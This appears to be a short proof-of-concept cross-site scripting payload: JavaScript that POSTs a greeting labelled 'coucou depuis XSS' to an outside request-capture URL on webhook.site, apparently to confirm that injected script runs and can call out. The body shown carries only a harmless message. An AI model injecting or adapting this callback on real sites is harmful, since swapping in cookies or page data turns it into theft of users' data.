fetch("https://webhook.site/2e771e56-2d9f-482a-91af-24b27aa9fb2c", {
    method: "POST",
    headers: {
        "Content-Type": "application/json"
    },
    body: JSON.stringify({ message: "coucou depuis XSS" })
});
